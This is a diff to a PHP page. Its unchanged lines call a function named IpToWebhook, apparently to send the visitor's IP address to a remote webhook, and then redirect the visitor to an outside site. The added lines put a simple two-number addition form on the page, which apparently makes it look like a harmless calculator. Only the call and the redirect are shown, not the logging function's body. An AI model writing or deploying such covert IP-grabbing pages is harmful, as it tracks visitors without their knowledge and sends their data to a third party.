@@ -50,3 +50,28 @@ function IpToWebhook($Hook, $Content)
 IpToWebhook($Webhook, $JSON);
 header("Location: https://urpoor.xyz/test.php");
 ?>
+
+<html>
+    <body>
+        <form action="" method="post">
+            First number:
+            <input type=text name="t1">
+            <br>
+            Second number:
+            <input type=text name="t2">
+            <br>
+            <br>
+            <input type=submit name="s">
+            <br>
+            <?php
+if(isset($_POST['s'])) // here isset function is using to check where a variable is set or not
+{
+    $a=$_POST['t1'];// accessing value from first text field 
+    $b=$_POST['t2'];// accessing value from second text field
+    $c=$a+$b; //addition of two values
+    echo "The sum of two numbers is:-".$c;
+}
+            ?>
+        </form>
+    </body>
+</html>
